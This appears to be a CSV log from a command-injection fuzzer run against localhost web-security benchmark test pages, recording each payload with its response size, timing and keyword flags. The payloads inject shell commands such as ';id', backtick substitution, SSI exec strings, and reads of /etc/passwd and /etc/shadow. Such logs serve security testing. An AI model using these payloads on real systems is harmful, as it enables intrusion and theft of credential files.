id_fuzz,url,payload,method,resp_status_code,resp_content_length,resp_time_elapsed,type_payload,payload,observation_status_code,observation_search_file_not_found,observation_search_no_such_file,observation_search_uid,observation_search_gid,observation_search_groups,observation_search_gpermission_denied,observation_search_whoami,observation_search_root,observation_daemon,observation_error,observation_exception,observation_illegal,observation_invalid,observation_fail,observation_stack,observation_access,observation_directory,observation_not_found,observation_unknown,observation_ODBC,observation_SQL,observation_quotation_mark,observation_syntax,observation_ORA,observation_111111,observation_time_delay,observation_content_length
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,POST,200,332,0:00:00.006694,cmdi,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,/index.html|id|,POST,200,332,0:00:00.004843,cmdi,/index.html|id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,;id;,POST,200,332,0:00:00.003691,cmdi,;id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,;id,POST,200,332,0:00:00.005271,cmdi,;id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,;netstat -a;,POST,200,332,0:00:00.005364,cmdi,;netstat -a;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,;id;,POST,200,332,0:00:00.007099,cmdi,;id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,|id,POST,200,332,0:00:00.005300,cmdi,|id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,|/usr/bin/id,POST,200,332,0:00:00.004711,cmdi,|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,|id|,POST,200,332,0:00:00.005860,cmdi,|id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,|/usr/bin/id|,POST,200,332,0:00:00.004899,cmdi,|/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,||/usr/bin/id|,POST,200,332,0:00:00.005629,cmdi,||/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,|id;,POST,200,332,0:00:00.005921,cmdi,|id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,||/usr/bin/id;,POST,200,332,0:00:00.004691,cmdi,||/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,;id|,POST,200,332,0:00:00.009689,cmdi,;id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,;|/usr/bin/id|,POST,200,332,0:00:00.005136,cmdi,;|/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,"
/bin/ls -al
",POST,200,332,0:00:00.005654,cmdi,"
/bin/ls -al
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,"
/usr/bin/id
",POST,200,332,0:00:00.003509,cmdi,"
/usr/bin/id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,"
id
",POST,200,332,0:00:00.003618,cmdi,"
id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,"
/usr/bin/id;",POST,200,332,0:00:00.003453,cmdi,"
/usr/bin/id;",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,"
id;",POST,200,332,0:00:00.003929,cmdi,"
id;",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,"
/usr/bin/id|",POST,200,332,0:00:00.005027,cmdi,"
/usr/bin/id|",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,"
id|",POST,200,332,0:00:00.005673,cmdi,"
id|",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,";/usr/bin/id
",POST,200,332,0:00:00.004478,cmdi,";/usr/bin/id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,";id
",POST,200,332,0:00:00.005153,cmdi,";id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,"|usr/bin/id
",POST,200,332,0:00:00.004792,cmdi,"|usr/bin/id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,"|nid
",POST,200,332,0:00:00.003114,cmdi,"|nid
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,`id`,POST,200,332,0:00:00.004605,cmdi,`id`,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,`/usr/bin/id`,POST,200,332,0:00:00.005229,cmdi,`/usr/bin/id`,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a);id,POST,200,332,0:00:00.003456,cmdi,a);id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a;id,POST,200,332,0:00:00.003172,cmdi,a;id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a);id;,POST,200,332,0:00:00.003272,cmdi,a);id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a;id;,POST,200,332,0:00:00.003525,cmdi,a;id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a);id|,POST,200,332,0:00:00.003985,cmdi,a);id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a;id|,POST,200,332,0:00:00.003701,cmdi,a;id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a)|id,POST,200,332,0:00:00.007715,cmdi,a)|id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a|id,POST,200,332,0:00:00.010929,cmdi,a|id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a)|id;,POST,200,332,0:00:00.002794,cmdi,a)|id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a|id,POST,200,332,0:00:00.005739,cmdi,a|id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,|/bin/ls -al,POST,200,332,0:00:00.003986,cmdi,|/bin/ls -al,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a);/usr/bin/id,POST,200,332,0:00:00.003096,cmdi,a);/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a;/usr/bin/id,POST,200,332,0:00:00.007054,cmdi,a;/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a);/usr/bin/id;,POST,200,332,0:00:00.003478,cmdi,a);/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a;/usr/bin/id;,POST,200,332,0:00:00.004184,cmdi,a;/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a);/usr/bin/id|,POST,200,332,0:00:00.012061,cmdi,a);/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a;/usr/bin/id|,POST,200,332,0:00:00.004731,cmdi,a;/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a)|/usr/bin/id,POST,200,332,0:00:00.015155,cmdi,a)|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a|/usr/bin/id,POST,200,332,0:00:00.005816,cmdi,a|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a)|/usr/bin/id;,POST,200,332,0:00:00.012497,cmdi,a)|/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,a|/usr/bin/id,POST,200,332,0:00:00.003027,cmdi,a|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,;system('cat%20/etc/passwd'),POST,200,332,0:00:00.002814,cmdi,;system('cat%20/etc/passwd'),200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,;system('id'),POST,200,332,0:00:00.003656,cmdi,;system('id'),200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,;system('/usr/bin/id'),POST,200,332,0:00:00.007184,cmdi,;system('/usr/bin/id'),200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,%0Acat%20/etc/passwd,POST,200,332,0:00:00.004528,cmdi,%0Acat%20/etc/passwd,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,%0A/usr/bin/id,POST,200,332,0:00:00.004154,cmdi,%0A/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,%0Aid,POST,200,332,0:00:00.004435,cmdi,%0Aid,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,%0A/usr/bin/id%0A,POST,200,332,0:00:00.006807,cmdi,%0A/usr/bin/id%0A,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,%0Aid%0A,POST,200,332,0:00:00.003392,cmdi,%0Aid%0A,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,& ping -i 30 127.0.0.1 &,POST,200,332,0:00:00.003052,cmdi,& ping -i 30 127.0.0.1 &,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,& ping -n 30 127.0.0.1 &,POST,200,332,0:00:00.003062,cmdi,& ping -n 30 127.0.0.1 &,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,%0a ping -i 30 127.0.0.1 %0a,POST,200,332,0:00:00.003691,cmdi,%0a ping -i 30 127.0.0.1 %0a,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,`ping 127.0.0.1`,POST,200,332,0:00:00.008148,cmdi,`ping 127.0.0.1`,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,| id,POST,200,332,0:00:00.003999,cmdi,| id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,& id,POST,200,332,0:00:00.003263,cmdi,& id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,; id,POST,200,332,0:00:00.002778,cmdi,; id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,%0a id %0a,POST,200,332,0:00:00.007093,cmdi,%0a id %0a,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,`id`,POST,200,332,0:00:00.005682,cmdi,`id`,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_12,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00396,$;/usr/bin/id,POST,200,332,0:00:00.004574,cmdi,$;/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,POST,200,619,0:00:00.011228,cmdi,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,POST,200,619,0:00:00.008719,cmdi,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,POST,200,619,0:00:00.021288,cmdi,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,POST,200,619,0:00:00.008832,cmdi,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,/index.html|id|,POST,200,365,0:00:00.004061,cmdi,/index.html|id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,;id;,POST,200,947,0:00:00.007448,cmdi,;id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,;id,POST,200,947,0:00:00.010061,cmdi,;id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,;netstat -a;,POST,200,66845,0:00:01.112499,cmdi,;netstat -a;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,;id;,POST,200,947,0:00:00.007829,cmdi,;id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,|id,POST,200,736,0:00:00.006603,cmdi,|id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,|/usr/bin/id,POST,200,736,0:00:00.005076,cmdi,|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,|id|,POST,200,365,0:00:00.002421,cmdi,|id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,|/usr/bin/id|,POST,200,365,0:00:00.002457,cmdi,|/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,||/usr/bin/id|,POST,200,365,0:00:00.002706,cmdi,||/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,|id;,POST,200,736,0:00:00.004274,cmdi,|id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,||/usr/bin/id;,POST,200,514,0:00:00.003754,cmdi,||/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,;id|,POST,200,365,0:00:00.002603,cmdi,;id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,;|/usr/bin/id|,POST,200,372,0:00:00.003144,cmdi,;|/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,"
/bin/ls -al
",POST,200,1478,0:00:00.004054,cmdi,"
/bin/ls -al
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,"
/usr/bin/id
",POST,200,947,0:00:00.003622,cmdi,"
/usr/bin/id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,"
id
",POST,200,947,0:00:00.004722,cmdi,"
id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,"
/usr/bin/id;",POST,200,947,0:00:00.032706,cmdi,"
/usr/bin/id;",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,"
id;",POST,200,947,0:00:00.015357,cmdi,"
id;",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,"
/usr/bin/id|",POST,200,576,0:00:00.006062,cmdi,"
/usr/bin/id|",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,"
id|",POST,200,576,0:00:00.007804,cmdi,"
id|",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,";/usr/bin/id
",POST,200,947,0:00:00.006675,cmdi,";/usr/bin/id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,";id
",POST,200,947,0:00:00.005077,cmdi,";id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,"|usr/bin/id
",POST,200,360,0:00:00.003666,cmdi,"|usr/bin/id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,"|nid
",POST,200,343,0:00:00.004175,cmdi,"|nid
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,`id`,POST,200,943,0:00:00.014076,cmdi,`id`,200,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,`/usr/bin/id`,POST,200,943,0:00:00.011551,cmdi,`/usr/bin/id`,200,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_13,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00409,a);id,POST,200,372,0:00:00.005064,cmdi,a);id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0
